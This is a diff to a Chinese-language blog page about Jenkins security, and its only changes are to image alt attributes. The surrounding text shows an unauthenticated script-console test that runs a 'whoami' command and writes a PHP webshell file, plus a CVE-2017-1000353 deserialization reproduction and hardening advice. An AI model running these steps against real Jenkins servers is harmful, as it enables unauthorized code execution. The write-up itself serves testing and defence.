@@ -532,15 +532,15 @@ dpkg -i jenkins_1.621_all.deb <span class="token comment" spellcheck="true"># �
 浏览器器访问http://192.168.0.100:8080/
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h4><p>访问<code>http://192.168.0.100:8080/manage</code>可以看到没有任何限制可以直接访问</p>
-<h4 id="Jenkins未授权访问写shell"><a href="#Jenkins未授权访问写shell" class="headerlink" title="Jenkins未授权访问写shell"></a>Jenkins未授权访问写shell</h4><p>1.点击“脚本命令行”<br><img src="http://image.xpshuai.cn/Jenkins_consele.png" alt=""></p>
+<h4 id="Jenkins未授权访问写shell"><a href="#Jenkins未授权访问写shell" class="headerlink" title="Jenkins未授权访问写shell"></a>Jenkins未授权访问写shell</h4><p>1.点击“脚本命令行”<br><img src="http://image.xpshuai.cn/Jenkins_consele.png" alt></p>
 <p>2.执行系统命令</p>
 <pre class="line-numbers language-bash"><code class="language-bash">println <span class="token string">"whoami"</span>.execute<span class="token punctuation">(</span><span class="token punctuation">)</span>.text
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p> 3.利用“脚本命令行”写webshell,(<code>需要一定的权限且知道网站绝对路径</code>)，点击运行,写入成功</p>
 <pre class="line-numbers language-bash"><code class="language-bash">new File <span class="token punctuation">(</span><span class="token string">"/var/www/html/shell.php"</span><span class="token punctuation">)</span>.write<span class="token punctuation">(</span><span class="token string">'&lt;?php phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="http://image.xpshuai.cn/Jenkins_cmd.png" alt=""></p>
-<p>4.访问shell.php， 测试成功<br><img src="http://image.xpshuai.cn/Jenkins_shell.png" alt=""></p>
+<p><img src="http://image.xpshuai.cn/Jenkins_cmd.png" alt></p>
+<p>4.访问shell.php， 测试成功<br><img src="http://image.xpshuai.cn/Jenkins_shell.png" alt></p>
 <h4 id="CVE-2017-1000353"><a href="#CVE-2017-1000353" class="headerlink" title="CVE-2017-1000353"></a>CVE-2017-1000353</h4><blockquote>
 <p>这是一个java反序列化漏洞</p>
 </blockquote>
@@ -591,9 +591,9 @@ Connection: close
 Cookie: JSESSIONID.a3c40b9a=node010r4vkf3cix27hr5qd9qvw5y41.node0; screenResolution=1920x1080
 Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
-</code></pre><p>进入容器: <code>docker-compose exec jenkins bash</code>,看到 /tmp/success文件创建成功<br><img src="http://image.xpshuai.cn/Jenkins_poc_ok.png" alt=""></p>
-<h4 id="配置方面的安全问题"><a href="#配置方面的安全问题" class="headerlink" title="配置方面的安全问题"></a>配置方面的安全问题</h4><p>1.允许任意账户注册 带来的安全问题<br><img src="http://image.xpshuai.cn/Jenkins_reg_any.png" alt=""><br>关闭用户注册<br><img src="http://image.xpshuai.cn/Jenkins_reg.png" alt=""></p>
-<p>2.允许匿名访问带来的问题<br>建议关闭<br><img src="http://image.xpshuai.cn/Jenkins_nologin.png" alt=""></p>
+</code></pre><p>进入容器: <code>docker-compose exec jenkins bash</code>,看到 /tmp/success文件创建成功<br><img src="http://image.xpshuai.cn/Jenkins_poc_ok.png" alt></p>
+<h4 id="配置方面的安全问题"><a href="#配置方面的安全问题" class="headerlink" title="配置方面的安全问题"></a>配置方面的安全问题</h4><p>1.允许任意账户注册 带来的安全问题<br><img src="http://image.xpshuai.cn/Jenkins_reg_any.png" alt><br>关闭用户注册<br><img src="http://image.xpshuai.cn/Jenkins_reg.png" alt></p>
+<p>2.允许匿名访问带来的问题<br>建议关闭<br><img src="http://image.xpshuai.cn/Jenkins_nologin.png" alt></p>
 <p>jenkins的日志功能不是很好（可以使用代理，并进行操作的记录）</p>
 <h4 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h4><ul>
 <li>使用最新版的jenkins</li>
